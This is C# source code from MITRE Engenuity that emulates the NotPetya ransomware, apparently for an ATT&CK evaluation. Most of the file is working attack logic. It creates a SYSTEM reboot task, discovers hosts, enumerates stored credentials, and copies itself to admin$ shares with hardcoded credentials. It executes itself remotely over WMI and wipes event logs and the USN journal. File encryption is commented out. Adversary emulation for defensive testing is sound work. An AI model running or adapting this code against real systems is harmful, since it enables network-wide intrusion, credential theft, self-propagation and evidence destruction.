/*=============================================================================================
*
*    Description:  This program emulates NotPetya.
*   
*        Version:  1.0
*        Created:  September 1st, 2021
*
*      Author(s):  Jesse Burgoon
*   Organization:  MITRE Engenuity
*
*  References(s): https://attack.mitre.org/software/S0368/
*
*=============================================================================================
*/
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;

namespace SharpNP
{
	class NPMain
	{
        static public bool IsElevated()
        {
            var id = WindowsIdentity.GetCurrent();
            var prin = new WindowsPrincipal(id);
            return prin.IsInRole(WindowsBuiltInRole.Administrator);
        }

        [DllImport("Kernel32.dll")]
        public static extern Boolean AttachConsole(int pid);

        [DllExport]
        static public void Main()
        {
            // Attach DLL to the current console so we can monitor NotPetya's progress.
            AttachConsole(-1);

            // ********************** Step 0 **********************
            // NotPetya checks if “ C:\README.txt” exists. If the file exists, the ransomware exits.
            Console.WriteLine("[i] Checking for mutext file: 'C:\\README.txt' to see if we're already infected.");
            if (File.Exists(@"C:\README.txt"))
            {
                Console.WriteLine("[!] 'C:\\README.txt' found; we're already infected, exiting");
                Environment.Exit(1);
            }

            if (!IsElevated())
            {
                Console.WriteLine("[!] error - this program must be run with administrator privileges, exiting");
                Environment.Exit(1);
            }

            // NotPetya creates a task to reboot the system one hour after infection.
            // We set the schtasks to 0600 AM; however, we execute it manually at the end of this program.

            Console.WriteLine("[i] Creating scheduled task to reboot after infection");
            string schTasksCmd;
            schTasksCmd = "/C schtasks /create /F /TN Restart /RU SYSTEM /TR \"powershell.exe -c Restart-Computer -Force\" /sc once /st 06:00";
            System.Diagnostics.Process.Start("CMD.exe", schTasksCmd);

            // ********************** Step 1 **********************
            // Host discovery for propagation
            // Returns a list of valid IP addresses to attempt to propagate to using:
            // - Process TCP connections
            // - ARP Cache
            //
            // Only 10.0.1.18 is returned for the MITRE ATT&CK Evaluation

            Console.WriteLine("[i] Searching for lateral targets");
            List<uint> discovered_ips = SharpNP.NPDiscovery.IPDiscovery();
            foreach (var ip in discovered_ips)
            {
                IPAddress addr = new IPAddress(ip);
                Console.WriteLine("[+] Discovered lateral targets: {0}", addr.ToString());
            }

            // ********************** Step 2 **********************
            // Attempt to steal credentials with CredEnumerateW

            NPCredEnum.Credential[] results = null;
            SharpNP.NPCredEnum.CredEnum(null, out results);

            // ********************** Step 3 & 4 **********************
            // Copy itself to discovered hosts to \\HOST\admin$\ as perfc.dat
            // Execute dropped file via WMI

            // Using #2 (Child() below) to prevent a nasty loop where hosts continually infect and run
            string remoteBinaryPath = "\"C:\\Windows\\System32\\rundll32.exe \\\"C:\\Windows\\perfc.dat\\\"#2\"";

            string NPPath = @"C:\Windows\perfc.dat";

            // For each valid IP in the list, attempt to execute the dropped file
            foreach (var ip in discovered_ips)
            {
                IPAddress addr = new IPAddress(ip);
                try
                {
                    Console.WriteLine("[i] Copying notPetya to: {0}", addr.ToString());
                    SharpNP.CpAdminShare.CopyNpToShare(NPPath, "\\\\" + addr.ToString() + "\\admin$", @"dune\patreides", "ebqMB7DmM81QVUqpf7XI");
                    Console.WriteLine("[i] Executing notPetya on: {0}", addr.ToString());
                    SharpNP.ProcExec.SharpWmiRemoteExec(addr.ToString(), @"dune\patreides", "ebqMB7DmM81QVUqpf7XI", remoteBinaryPath);
                }
                catch (Exception e)
                {
                    // do nothing on error
                    Console.WriteLine("[!] Error on lateral movement: \n{0}", e);
                }
            }


            // ********************** Step 5 **********************
            // Encrypt files --- REMOVED
            Console.WriteLine("[!] File Encryption removed");
            //SharpNP.NPCrypt.EncryptFiles();

            // ********************** Step 6 **********************
            // Delete local logs with the following command:
            // cmd.exe /c wevtutil cl Setup & wevtutil cl System &wevtutil cl Security &wevtutil cl Application &fsutil usn deletejournal /D C:
            
            Console.WriteLine("[i] Wiping logs");
            string evasionBin = @"C:\Windows\System32\cmd.exe";
            string evasionArgs = @"/c wevtutil cl Setup & wevtutil cl System & wevtutil cl Security & wevtutil cl Application & fsutil usn deletejournal /D C:";

            SharpNP.ProcExec.SharpProcExec(evasionBin, evasionArgs);

            // Add 3 min delay to ensure execution
            Console.WriteLine("[i] Pausing 3 minutes");
            Thread.Sleep(180000);

            // ********************** Step 7 **********************
            // Kick off scheduled task to restart host

            Console.WriteLine("[i] Executing scheduled task to force reboot... wait 30 seconds");
            schTasksCmd = "/C schtasks.exe /RUN /TN Restart";
            System.Diagnostics.Process.Start("CMD.exe", schTasksCmd);
            Thread.Sleep(30000);
            Console.WriteLine("[i] scheduled task didn't fire :(");

        }

        [DllExport]
        static public void Child()
        {
            // ********************** Step 0 **********************
            if (!IsElevated())
            {
                Environment.Exit(1);
            }

            string schTasksCmd;
            schTasksCmd = "/C schtasks /create /F /TN Restart /RU SYSTEM /TR \"powershell.exe -c Restart-Computer -Force\" /sc once /st 06:00";
            System.Diagnostics.Process.Start("CMD.exe", schTasksCmd);

            // ********************** Step 1 **********************
            // Host discovery for propagation

            List<uint> discovered_ips = SharpNP.NPDiscovery.IPDiscovery();

            // ********************** Step 2 **********************
            // Attempt to steal credentials with CredEnumerateW

            NPCredEnum.Credential[] results = null;
            SharpNP.NPCredEnum.CredEnum(null, out results);

            // ********************** Step 3 & 4 **********************
            // Execution skipped to prevent a reinfection loop

            // ********************** Step 5 **********************
            // Encrypt files --- REMOVED
            // SharpNP.NPCrypt.EncryptFiles();

            // ********************** Step 6 **********************
            // Delete local logs 

            string evasionBin = @"C:\Windows\System32\cmd.exe";
            string evasionArgs = @"/c wevtutil cl Setup & wevtutil cl System & wevtutil cl Security & wevtutil cl Application & fsutil usn deletejournal /D C:";

            SharpNP.ProcExec.SharpProcExec(evasionBin, evasionArgs);

            // Add 3 min delay to ensure execution
            Thread.Sleep(180000);

            // ********************** Step 7 **********************
            // Kick off scheduled task to restart host

            schTasksCmd = "/C schtasks.exe /RUN /TN Restart";
            System.Diagnostics.Process.Start("CMD.exe", schTasksCmd);
            Thread.Sleep(30000);
        }
    }

}